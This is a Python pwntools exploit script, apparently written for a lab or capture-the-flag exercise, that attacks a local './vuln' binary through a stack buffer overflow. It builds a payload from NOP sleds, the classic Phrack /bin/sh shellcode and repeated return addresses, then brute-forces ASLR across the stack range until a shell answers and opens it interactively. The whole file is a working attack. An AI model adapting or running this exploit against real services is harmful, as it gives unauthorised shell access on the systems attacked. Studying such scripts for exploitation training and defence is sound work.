#!/usr/bin/python

from pwn import *
from time import sleep
from copy import deepcopy
import sys

# phrack 48-byte shelcode 
# http://phrack.org/issues/49/14.html
shellcode = ("\xeb\x1f\x5e\x89\x76\x08\x31\xc0"
             "\x88\x46\x07\x89\x46\x0c\xb0\x0b"
             "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
             "\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
             "\x80\xe8\xdc\xff\xff\xff/bin/sh")

stack_start = 0xbffdf000
stack_end   = 0xc0000000

offset = 256 
nop = "\x90"*200
#eip = 0xbffff923
eip = stack_start
pad = "A"*(offset - len(nop) - len(shellcode))

bar = ["=" for _ in range(51)]
stack_range = stack_end - stack_start
rev = False

print "Brute forcing ASLR....."

while (True):
    
    # -------------- Progress bar ------------------ #

    p = (eip - stack_start)*100/stack_range
    percen = str(p) + "%"
    
    tmp = deepcopy(bar)

    tmp[p/2] = str(hex(eip))
    s = "".join(tmp)
    
    string  = str(hex(eip))
    string += ": "
    string += "("+str(hex(stack_start))+")"
    string += s
    string += "("+str(hex(stack_end))+")"
    string += " "
    string += percen

    sys.stdout.write(string + "\n")
    sys.stdout.write("\x1b[A")
    sys.stdout.flush()
    
    # -------------- End progress bar -------------- #
    
    #sleep(0.01)
    if (eip > stack_end):
        rev = True
    if (eip < stack_start):
        rev = False

    payload  = ""           # payload
    payload += nop          # nope sled of 200 bytes
    payload += shellcode    # shellcode
    payload += pad          # some padding
    payload += p32(eip)*4   # eip to jump to
    payload += nop*3        # a bigger nop sled 
    payload += shellcode    # shellcode at the end
    
    #r = remote("localhost", 1337, level='error')
    r = process("./vuln", level='error')
    #print payload.encode('hex')
    try:
        r.sendline(payload)
        r.sendline("id")
        data = r.recv(1024)
        #print len(data)
        if len(data) <= 5:
            continue
        #print string 
        #print "offset:", offset, "len:", len(payload),"eip:", hex(eip)
        print(data)
        r.interactive()
    except:
        r.close()
    
    if rev == False:
        eip += 180
    else:
        eip -= 180
